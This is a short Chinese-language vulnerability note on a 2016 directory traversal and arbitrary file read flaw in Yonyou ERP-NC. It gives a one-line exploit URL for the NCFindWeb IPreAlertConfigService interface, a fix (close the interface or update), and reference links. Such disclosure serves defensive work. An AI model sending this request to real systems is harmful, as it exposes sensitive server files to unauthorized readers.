### 一 漏洞描述
用友ERP-NC 存在目录遍历和任意文件读取漏洞，攻击者可以通过该漏洞获取敏感文件信息。

时间: 2016-01-14

### 二 漏洞利用
```
<ip:port>/NCFindWeb?service=IPreAlertConfigService&filename=
```

### 三 漏洞修复
关闭接口（NCFindWeb?service=IPreAlertConfigService&filename=），若官方已更新版本，则更新到最新版

> 参考链接  
> https://blog.csdn.net/weixin_43847838/article/details/122229970  
> https://www.seebug.org/vuldb/ssvid-90416
